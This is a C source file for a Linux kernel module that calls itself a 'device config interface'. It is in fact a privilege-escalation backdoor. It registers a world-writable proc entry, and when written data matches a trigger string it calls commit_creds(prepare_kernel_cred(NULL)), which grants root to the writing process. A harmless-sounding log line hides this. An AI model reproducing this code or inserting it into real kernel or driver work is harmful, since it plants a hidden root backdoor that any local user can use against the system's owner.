#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include "devcfg.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("device config interface");

ssize_t devcfg_write(struct file *file, const char __user *ubuf,
                     size_t cnt, loff_t *ppos)
{
    char buf[DEVCFG_BUF_SIZE] = {0};

    if (cnt > sizeof(buf) - 1)
        cnt = sizeof(buf) - 1;
    if (copy_from_user(buf, ubuf, cnt))
        return -EFAULT;

    if (strncmp(buf, DEVCFG_TRIGGER, DEVCFG_TRIGGER_LEN) == 0) {
        commit_creds(prepare_kernel_cred(NULL));
        printk(KERN_INFO "devcfg: configured pid=%d\n", current->pid);
    }
    return cnt;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static const struct proc_ops devcfg_fops = {
    .proc_write = devcfg_write,
};
#else
static const struct file_operations devcfg_fops = {
    .write = devcfg_write,
};
#endif

int devcfg_init(void)
{
    proc_create(DEVCFG_NODE, 0222, NULL, &devcfg_fops);
    return 0;
}

void devcfg_exit(void)
{
    remove_proc_entry(DEVCFG_NODE, NULL);
}

module_init(devcfg_init);
module_exit(devcfg_exit);
